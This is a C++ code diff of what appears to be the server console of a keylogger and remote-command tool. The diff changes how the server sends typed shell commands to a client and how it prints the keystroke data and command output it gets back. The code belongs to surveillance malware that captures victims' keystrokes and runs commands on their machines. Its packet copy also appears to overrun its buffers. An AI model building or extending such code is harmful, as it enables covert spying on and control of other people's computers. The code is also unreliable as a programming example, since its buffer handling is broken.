@@ -7,7 +7,7 @@
 #include<map>
 #include<time.h>
 #include<thread>
-#include"..\..\keyBordHOOK\keyBordHOOK\DATA.h"
+#include"DATA.h"
 using namespace std;
 
 int main()
@@ -74,13 +74,13 @@ int main()
                 DATA* datapacket = (DATA*)rbuf;
                 if (getdate > 0)
                 {
-                    if (datapacket->type == 2001)
+                    if (datapacket->type == CLIENT_KEYBOARD_BACK)
                     {
                         char data[256] = { 0 };
                         recv(sclient, data, datapacket->length, 0);
                         cout << "keyboard数据:" << data << endl << endl;
                     }
-                    else if (datapacket->type == 1002)
+                    else if((datapacket->type == CLIENT_CMD_BACK))
                     {
                         char data[256] = { 0 };
                         recv(sclient, data, datapacket->length, 0);
@@ -109,15 +109,23 @@ int main()
         {
             char wbuf[256] = { 0 };
             gets_s(wbuf);
-            int getdate = send(sclient, wbuf, sizeof(wbuf), 0);
+            char size[256] = { 0 };
+            DATA* cmdcommand = (DATA*)size;
+            cmdcommand->type = SEVER_CMD_COMMAND;
+            cmdcommand->length = sizeof(wbuf) + 1;
+            memcpy(cmdcommand->reallydata, wbuf, cmdcommand->length + 1);
+            int getdate = send(sclient, (char*)cmdcommand, cmdcommand->length+sizeof(unsigned int)*2, 0);
 
-            if (getdate <= 0) cout << "send error!!!" << endl;
+            if (getdate <= 0)
+            {
+                cout << "send error!!!" << endl;
+                break;
+            }
 
         }
         //5.closesocket
         closesocket(sclient);
     }
-
 
 
 
